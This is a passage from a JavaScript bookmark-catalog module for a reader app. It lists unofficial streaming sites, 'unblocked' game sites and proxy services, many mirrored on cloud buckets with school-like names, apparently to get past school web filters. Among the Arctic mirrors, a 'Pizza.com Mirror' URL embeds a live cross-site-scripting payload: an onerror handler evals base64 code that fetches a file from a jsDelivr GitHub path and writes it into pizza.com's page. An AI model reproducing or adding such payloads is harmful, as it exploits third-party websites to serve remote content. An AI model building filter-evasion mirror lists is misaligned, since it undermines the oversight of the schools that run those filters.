/* One canonical built-in catalog and review engine for all bookmark readers. */
(function(root,factory){
  if(typeof module==='object' && module.exports) module.exports=factory(require('./heavenly-navigation'));
  else root.HeavenlyCatalog=factory(root.HeavenlyNavigation);
}(typeof self!=='undefined'?self:this,function(navigation){
  'use strict';
  var defaults = {
  "categories": [
    {
      "id": "cat_movies",
      "title": "Movies/Shows",
      "side": "left",
      "order": 0,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "builtin",
          "title": "Built-In",
          "builtIn": true
        },
        {
          "id": "naenae",
          "title": "Nae-Nae",
          "builtIn": true,
          "defaultCollapsed": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": true
        }
      ]
    },
    {
      "id": "cat_anime",
      "title": "Anime/Manga",
      "side": "right",
      "order": 0,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "builtin",
          "title": "Built-In",
          "builtIn": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": true
        }
      ]
    },
    {
      "id": "cat_games",
      "title": "Games",
      "side": "bottom",
      "order": 0,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "builtin",
          "title": "Built-In",
          "builtIn": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": true
        }
      ]
    },
    {
      "id": "cat_op_websites",
      "title": "OP Websites",
      "side": "bottom",
      "order": 1,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "browser_games",
          "title": "Browser/Games",
          "icon": "globe",
          "builtIn": true
        },
        {
          "id": "docs_games",
          "title": "Docs/Games",
          "icon": "file-text",
          "builtIn": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": false
        }
      ]
    }
  ],
  "bookmarks": [
    {
      "id": "bm_everythingmoe",
      "categoryId": "cat_anime",
      "title": "EverythingMoe",
      "url": "https://everythingmoe.com/",
      "type": "bookmark",
      "icon": "/proxy/https://everythingmoe.com/favicon.ico",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_fmhy_anime",
      "categoryId": "cat_anime",
      "title": "FMHY: Anime",
      "url": "https://fmhy.net/video#anime-streaming",
      "type": "bookmark",
      "icon": "/assets/icons/fmhy-halloween-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_anisnatch",
      "categoryId": "cat_anime",
      "title": "AniSnatch",
      "url": "https://anisnatch.top/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=anisnatch.top&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_miruro",
      "categoryId": "cat_anime",
      "title": "Miruro",
      "url": "https://www.miruro.bz/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=miruro.bz&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_aniclover",
      "categoryId": "cat_anime",
      "title": "AniClover",
      "url": "https://aniclover.cc/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=aniclover.cc&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_anidb",
      "categoryId": "cat_anime",
      "title": "AniDB",
      "url": "https://anidb.se",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=anidb.se&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": []
    },
    {
      "id": "bm_movish_anime",
      "categoryId": "cat_anime",
      "title": "Movish",
      "url": "https://movish.to/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=movish.to&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 7,
      "subBookmarks": [
        {
          "id": "sub_movish_latestmovies_anime",
          "title": "Latest Movies",
          "url": "https://latestmovies.net/",
          "icon": "https://www.google.com/s2/favicons?domain=latestmovies.net&sz=64"
        }
      ]
    },
    {
      "id": "bm_fmhy_movies",
      "categoryId": "cat_movies",
      "title": "FMHY: Movies",
      "url": "https://fmhy.net/video",
      "type": "bookmark",
      "icon": "/assets/icons/fmhy-halloween-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_streamopro",
      "categoryId": "cat_movies",
      "title": "Streamo",
      "url": "https://streamo.pro/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=streamo.pro&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_movish_movies",
      "categoryId": "cat_movies",
      "title": "Movish",
      "url": "https://movish.to/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=movish.to&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": [
        {
          "id": "sub_movish_latestmovies_movies",
          "title": "Latest Movies",
          "url": "https://latestmovies.net/",
          "icon": "https://www.google.com/s2/favicons?domain=latestmovies.net&sz=64"
        }
      ]
    },
    {
      "id": "bm_7movies",
      "categoryId": "cat_movies",
      "title": "7Movies",
      "url": "https://7movies.in/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=7movies.in&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_rivestream",
      "categoryId": "cat_movies",
      "title": "RiveStream",
      "url": "https://www.rivestream.app/",
      "type": "bookmark",
      "icon": "/proxy/https://www.rivestream.app/icons/icon-192x192.png",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_zig_and_sharko",
      "categoryId": "cat_movies",
      "subSectionId": "naenae",
      "title": "Zig & Sharko",
      "url": "https://www.youtube.com/results?search_query=zig+and+sharko+full+episodes",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=youtube.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_larva",
      "categoryId": "cat_movies",
      "subSectionId": "naenae",
      "title": "Larva",
      "url": "https://www.youtube.com/results?search_query=larva+full+episodes",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=youtube.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_spongebob",
      "categoryId": "cat_movies",
      "subSectionId": "naenae",
      "title": "SpongeBob",
      "url": "https://www.youtube.com/results?search_query=spongebob+full+episodes",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=youtube.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_individual_games",
      "categoryId": "cat_games",
      "title": "Individual Games",
      "url": "",
      "type": "folder",
      "icon": "preset:gamepad",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": [
        {
          "id": "sub_slopeplus",
          "title": "Slope Plus",
          "url": "https://lonfro.github.io/SlopePlusWeb/",
          "icon": "https://www.google.com/s2/favicons?domain=lonfro.github.io&sz=64"
        },
        {
          "id": "sub_whatbeatsrock",
          "title": "What Beats Rock",
          "url": "https://www.whatbeatsrock.com/",
          "icon": "https://www.google.com/s2/favicons?domain=whatbeatsrock.com&sz=64"
        },
        {
          "id": "sub_fnf",
          "title": "Friday Night Funkin",
          "url": "https://luckydog7.github.io/funkinmobile/game/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=luckydog7.github.io&sz=64"
        },
        {
          "id": "sub_geometrydash",
          "title": "Geometry Dash",
          "url": "https://web-dashers.github.io/",
          "icon": "https://www.google.com/s2/favicons?domain=web-dashers.github.io&sz=64"
        }
      ]
    },
    {
      "id": "bm_ng",
      "categoryId": "cat_games",
      "title": "Newgrounds: Syshi",
      "url": "https://newgrounds.com",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=newgrounds.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_sitesdotcom",
      "categoryId": "cat_games",
      "title": "SitesDotCom",
      "url": "https://games-b3749.web.app/",
      "type": "bookmark",
      "icon": "data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2280%22>%F0%9F%A5%94</text></svg>",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_grind1",
      "categoryId": "cat_games",
      "title": "GRIND1",
      "url": "https://zbr.base44.app",
      "type": "bookmark",
      "icon": "/proxy/https://yt3.googleusercontent.com/5pXcUZ6ujlD2Cd0loksX2Ju59RtAnfRS4lEG7uf6sd2yemKG33uu2x-31VrU08xAfpEGsUoVGSo=s160-c-k-c0x00ffffff-no-rj",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_gn_math",
      "categoryId": "cat_games",
      "title": "GN Math",
      "url": "https://gn-math.dev/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=gn-math.dev&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_user_ng",
      "categoryId": "cat_games",
      "title": "Newgrounds",
      "url": "https://newgrounds.com",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=newgrounds.com&sz=64",
      "builtIn": false,
      "hidden": false,
      "order": 99,
      "subBookmarks": []
    },
    {
      "id": "bm_gamebois",
      "categoryId": "cat_games",
      "title": "Gamebois",
      "url": "https://teddblue.github.io/gamebois/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=teddblue.github.io&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": []
    },
    {
      "id": "bm_ubg98",
      "categoryId": "cat_games",
      "title": "UBG98",
      "url": "https://ubg98.com",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=ubg98.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 6,
      "subBookmarks": []
    },
    {
      "id": "bm_cpsgames",
      "categoryId": "cat_games",
      "title": "CPS Games",
      "url": "https://cpsgames.org/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=cpsgames.org&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 7,
      "subBookmarks": []
    },
    {
      "id": "bm_ubgames",
      "categoryId": "cat_games",
      "title": "UBGames",
      "url": "https://ubgames.uk",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=ubgames.uk&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 8,
      "subBookmarks": []
    },
    {
      "id": "bm_unbleeked",
      "categoryId": "cat_games",
      "title": "Unbleeked",
      "url": "https://unbleeked.vercel.app/",
      "type": "folder_bookmark",
      "icon": "preset:sparkles",
      "builtIn": true,
      "hidden": false,
      "order": 9,
      "subBookmarks": []
    },
    {
      "id": "bm_duckmath",
      "categoryId": "cat_games",
      "title": "DuckMath",
      "url": "https://duckmath.org/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=duckmath.org&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 10,
      "disableQuickSaveWidget": true,
      "subBookmarks": [
        {
          "id": "sub_duckmath_a1",
          "title": "DuckMath a1",
          "url": "https://classroom-a1.b-cdn.net/",
          "icon": "https://www.google.com/s2/favicons?domain=duckmath.org&sz=64"
        }
      ]
    },
    {
      "id": "bm_emubrowser",
      "categoryId": "cat_games",
      "title": "EmuBrowser",
      "url": "https://emubrowser.com/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=emubrowser.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 11,
      "subBookmarks": []
    },
    {
      "id": "bm_gras2027",
      "categoryId": "cat_games",
      "title": "Gras 2027",
      "url": "https://www.gras2027.com/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=gras2027.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 12,
      "subBookmarks": []
    },
    {
      "id": "bm_funkymods",
      "categoryId": "cat_games",
      "title": "Funky Mods",
      "url": "https://funkymods.github.io/",
      "type": "bookmark",
      "icon": "preset:sparkles",
      "builtIn": true,
      "hidden": false,
      "order": 13,
      "subBookmarks": []
    },
    {
      "id": "bm_myretrogames",
      "categoryId": "cat_games",
      "title": "My RETROGAMES",
      "url": "https://theooofficial.github.io/myRETROGAMES/",
      "type": "folder_bookmark",
      "icon": "preset:gamepad",
      "builtIn": true,
      "hidden": false,
      "order": 14,
      "subBookmarks": []
    },
    {
      "id": "bm_mgalternative",
      "categoryId": "cat_games",
      "title": "Mountain Games",
      "url": "https://mgalternative.github.io",
      "type": "folder_bookmark",
      "icon": "preset:star",
      "builtIn": true,
      "hidden": false,
      "order": 15,
      "subBookmarks": []
    },
    {
      "id": "bm_masonsunblockedgames",
      "categoryId": "cat_games",
      "title": "Mason's Unblocked Games",
      "url": "https://masonsunblockedgames.github.io/MasonsUnblockedGames/",
      "type": "bookmark",
      "icon": "/proxy/https://masonsunblockedgames.github.io/MasonsUnblockedGames/favicon.ico",
      "builtIn": true,
      "hidden": false,
      "order": 16,
      "subBookmarks": []
    },
    {
      "id": "bm_geometryspot",
      "categoryId": "cat_games",
      "title": "Geometry Spot",
      "url": "https://geometryspot.com/activities/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=geometryspot.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 17,
      "subBookmarks": []
    },
    {
      "id": "bm_outredgames",
      "categoryId": "cat_games",
      "title": "Outred Games",
      "url": "https://outred.org/games.html",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=outred.org&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 18,
      "subBookmarks": []
    },
    {
      "id": "bm_interdimensional_lite",
      "categoryId": "cat_games",
      "title": "Interdimensional Lite",
      "url": "https://pinkdev.d13qic2f6zga3.amplifyapp.com",
      "type": "folder_bookmark",
      "icon": "/proxy/https://pinkdev.d13qic2f6zga3.amplifyapp.com/favicon.png",
      "builtIn": true,
      "hidden": false,
      "order": 19,
      "subBookmarks": []
    },
    {
      "id": "bm_3hk0lite",
      "categoryId": "cat_games",
      "title": "3hk0 Lite",
      "url": "https://75kh0.github.io",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=75kh0.github.io&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 20,
      "subBookmarks": []
    },
    {
      "id": "bm_bloxcraftstudios",
      "categoryId": "cat_games",
      "title": "Bloxcraft Studios",
      "url": "https://bloxcraft-ubg.pages.dev",
      "type": "bookmark",
      "icon": "/proxy/https://5kh0.github.io/bloxcraft_transparent.png",
      "builtIn": true,
      "hidden": false,
      "order": 21,
      "subBookmarks": [
        {
          "id": "sub_bloxcraft_5kh0",
          "title": "Bloxcraft (5kh0)",
          "url": "https://5kh0.github.io",
          "icon": ""
        },
        {
          "id": "sub_bloxcraft_fastly",
          "title": "Bloxcraft (Fastly)",
          "url": "https://bloxcraftubg.freetls.fastly.net/games/",
          "icon": "https://www.google.com/s2/favicons?domain=bloxcraftubg.freetls.fastly.net&sz=64"
        }
      ]
    },
    {
      "id": "bm_coolmath",
      "categoryId": "cat_games",
      "title": "Coolmath Games",
      "url": "https://www.coolmathgames.com/",
      "type": "bookmark",
      "icon": "/assets/icons/coolmath-icon.ico",
      "builtIn": true,
      "hidden": false,
      "order": 22,
      "subBookmarks": []
    },
    {
      "id": "bm_aether",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Aether",
      "url": "https://actstudy.s3.us-east-1.amazonaws.com/index.html",
      "type": "folder_bookmark",
      "icon": "/assets/icons/aether-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": [
        {
          "id": "sub_aether_1",
          "title": "Dogestudy Mirror",
          "url": "https://dogestudy.aether.samirchand.com.np/",
          "icon": "https://www.google.com/s2/favicons?domain=dogestudy.aether.samirchand.com.np&sz=64"
        },
        {
          "id": "sub_aether_2",
          "title": "AetherK12 S3 Mirror 1",
          "url": "https://aetherk12.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=aetherk12.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_3",
          "title": "AetherK12 S3 Mirror 2",
          "url": "https://s3.amazonaws.com/aetherk12/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_4",
          "title": "AdvancedAlg2 S3 Mirror 1",
          "url": "https://advancedalg2.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=advancedalg2.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_5",
          "title": "AdvancedAlg2 S3 Mirror 2",
          "url": "https://s3.amazonaws.com/advancedalg2/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_6",
          "title": "SchoolCDN S3 Mirror",
          "url": "https://schoolcdn.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=schoolcdn.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_7",
          "title": "AetherK12 US-East-1 Mirror",
          "url": "https://s3.us-east-1.amazonaws.com/aetherk12/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_8",
          "title": "AdvancedAlg2 US-East-1 Mirror",
          "url": "https://advancedalg2.s3.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=advancedalg2.s3.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_9",
          "title": "SchoolCDN Dualstack Mirror",
          "url": "https://schoolcdn.s3.dualstack.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=schoolcdn.s3.dualstack.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_10",
          "title": "SchoolCDN FIPS Mirror",
          "url": "https://schoolcdn.s3-fips.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=schoolcdn.s3-fips.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_11",
          "title": "ACTStudy S3 Mirror 1",
          "url": "https://actstudy.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_12",
          "title": "ACTStudy S3 Mirror 2",
          "url": "https://s3.amazonaws.com/actstudy/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_13",
          "title": "ACTStudy Dualstack Mirror",
          "url": "https://actstudy.s3.dualstack.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3.dualstack.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_14",
          "title": "ACTStudy US-East-1 Mirror",
          "url": "https://s3.us-east-1.amazonaws.com/actstudy/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_15",
          "title": "ACTStudy FIPS Mirror 1",
          "url": "https://actstudy.s3-fips.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3-fips.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_16",
          "title": "ACTStudy FIPS Mirror 2",
          "url": "https://actstudy.s3-fips.dualstack.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3-fips.dualstack.us-east-1.amazonaws.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_korona",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Korona",
      "url": "https://korona.lat/dashboard",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=korona.lat&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_nexus",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Nexus",
      "url": "https://car-meow.github.io/toothbrush/",
      "type": "bookmark",
      "icon": "/assets/icons/nexus-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_flux",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Flux",
      "url": "https://web.flux.focuznow.com/",
      "type": "folder_bookmark",
      "icon": "/proxy/https://web.flux.focuznow.com/assets/flux-mark.webp",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_opium",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Opium",
      "url": "https://opium.best/",
      "type": "folder_bookmark",
      "icon": "/assets/icons/opium-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": [
        {
          "id": "sub_opium_1",
          "title": "jsDelivr SVG Mirror",
          "url": "https://cdn.jsdelivr.net/gh/OpiumBest/svg/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_2",
          "title": "S3 OpiumBest Mirror",
          "url": "https://s3.amazonaws.com/opiumbest/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_3",
          "title": "OpiumBest S3 Host Mirror",
          "url": "https://opiumbest.s3.amazonaws.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbest.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_4",
          "title": "GCS OpiumBest Mirror",
          "url": "https://storage.googleapis.com/opiumbest/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_5",
          "title": "OpiumBest GCS Host Mirror",
          "url": "https://opiumbest.storage.googleapis.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbest.storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_6",
          "title": "Statically SVG Mirror",
          "url": "https://cdn.statically.io/gh/OpiumBest/svg@main/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.statically.io&sz=64"
        },
        {
          "id": "sub_opium_7",
          "title": "GitHub Pages Mirror",
          "url": "https://opiumbest.github.io/",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbest.github.io&sz=64"
        },
        {
          "id": "sub_opium_8",
          "title": "Bunny CDN SVG Mirror",
          "url": "https://jsdelivr.b-cdn.net/gh/OpiumBest/svg/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=jsdelivr.b-cdn.net&sz=64"
        },
        {
          "id": "sub_opium_9",
          "title": "esm.sh SVG Mirror",
          "url": "http://esm.sh/gh/OpiumBest/svg/icon.svg?raw",
          "icon": "https://www.google.com/s2/favicons?domain=esm.sh&sz=64"
        },
        {
          "id": "sub_opium_10",
          "title": "Clever Learning S3 Mirror",
          "url": "https://s3.amazonaws.com/cleverlearning/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_11",
          "title": "Clever Learning S3 Host Mirror",
          "url": "https://cleverlearning.s3.amazonaws.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cleverlearning.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_12",
          "title": "Google Classroom GCS Mirror",
          "url": "https://storage.googleapis.com/gclassroom/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_13",
          "title": "Google Classroom GCS Host Mirror",
          "url": "https://gclassroom.storage.googleapis.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=gclassroom.storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_14",
          "title": "OpiumBull S3 Mirror",
          "url": "https://s3.amazonaws.com/opiumbull/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_15",
          "title": "OpiumBull GCS Mirror",
          "url": "https://storage.googleapis.com/opiumbull/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_16",
          "title": "jsDelivr Bull33 Mirror",
          "url": "https://cdn.jsdelivr.net/gh/opiumbest/bull33/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_17",
          "title": "esm.sh Bull33 Mirror",
          "url": "http://esm.sh/gh/OpiumBest/bull33/icon.svg?raw",
          "icon": "https://www.google.com/s2/favicons?domain=esm.sh&sz=64"
        },
        {
          "id": "sub_opium_18",
          "title": "Statically Bull33 Mirror",
          "url": "https://cdn.statically.io/gh/OpiumBest/bull33@main/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.statically.io&sz=64"
        },
        {
          "id": "sub_opium_19",
          "title": "OpiumBull S3 Host Mirror",
          "url": "https://opiumbull.s3.amazonaws.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbull.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_20",
          "title": "jsDelivr NPM OpiumBest Mirror",
          "url": "https://cdn.jsdelivr.net/npm/opiumbest/index.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_21",
          "title": "jsDelivr NPM Classroom Mirror",
          "url": "https://cdn.jsdelivr.net/npm/classroomlearning/index.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_22",
          "title": "Topthink jsDelivr Mirror",
          "url": "https://jsdelivr.topthink.com/npm/opiumbest/index.svg",
          "icon": "https://www.google.com/s2/favicons?domain=jsdelivr.topthink.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_polaris",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Polaris",
      "url": "https://mathplayground.explosionlearning.org/",
      "type": "folder_bookmark",
      "icon": "/assets/polaris.svg",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": [
        {
          "id": "sub_polaris_1",
          "title": "Goontopia Mirror",
          "url": "https://goontopia.me/",
          "icon": "https://www.google.com/s2/favicons?domain=goontopia.me&sz=64"
        },
        {
          "id": "sub_polaris_2",
          "title": "Polara Render 1",
          "url": "https://polara-1.onrender.com/",
          "icon": "https://www.google.com/s2/favicons?domain=polara-1.onrender.com&sz=64"
        },
        {
          "id": "sub_polaris_3",
          "title": "Polaris Foff Mirror",
          "url": "https://polarisisthebest.foff.ch/",
          "icon": "https://www.google.com/s2/favicons?domain=polarisisthebest.foff.ch&sz=64"
        },
        {
          "id": "sub_polaris_4",
          "title": "Puppypoop Flort Mirror",
          "url": "https://puppypoop.flort.com.tr/",
          "icon": "https://www.google.com/s2/favicons?domain=puppypoop.flort.com.tr&sz=64"
        },
        {
          "id": "sub_polaris_5",
          "title": "Polara Render 2",
          "url": "https://polara-i1r7.onrender.com/",
          "icon": "https://www.google.com/s2/favicons?domain=polara-i1r7.onrender.com&sz=64"
        },
        {
          "id": "sub_polaris_6",
          "title": "Downing DNS Mirror",
          "url": "https://poopoo.downingdns.xyz/",
          "icon": "https://www.google.com/s2/favicons?domain=poopoo.downingdns.xyz&sz=64"
        },
        {
          "id": "sub_polaris_7",
          "title": "Math Skills Algebra Mirror",
          "url": "https://mathskillsalgebra.pepikutan.net/",
          "icon": "https://www.google.com/s2/favicons?domain=mathskillsalgebra.pepikutan.net&sz=64"
        },
        {
          "id": "sub_polaris_8",
          "title": "Lafairs Mirror",
          "url": "https://lafairs.sh8.no/",
          "icon": "https://www.google.com/s2/favicons?domain=lafairs.sh8.no&sz=64"
        }
      ]
    },
    {
      "id": "bm_arctic",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Arctic",
      "url": "https://storage.googleapis.com/math-homework/index.html",
      "type": "folder_bookmark",
      "icon": "/assets/icons/artic-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 6,
      "subBookmarks": [
        {
          "id": "sub_arctic_1",
          "title": "Arctic Games GCS",
          "url": "https://storage.googleapis.com/arctic-games/arctic.html",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_arctic_2",
          "title": "Padlet Mirror",
          "url": "https://uploads-usc1.padletcdn.com/4865083536/4e7c634432b37bba781530a0802763b7/arctic.html#/home",
          "icon": "https://www.google.com/s2/favicons?domain=padletcdn.com&sz=64"
        },
        {
          "id": "sub_arctic_3",
          "title": "Pizza.com Mirror",
          "url": "https://pizza.com/?s=%3Cimg%20src%20onerror=h=eval,h(atob(%27ZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9jcnNocWQvc3R1cmR5LWxhbXBASEVBRC9hcmN0aWMuc3ZnIikudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gdC50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe2RvY3VtZW50LndyaXRlKHQpfSk7%27))%3E",
          "icon": "https://www.google.com/s2/favicons?domain=pizza.com&sz=64"
        },
        {
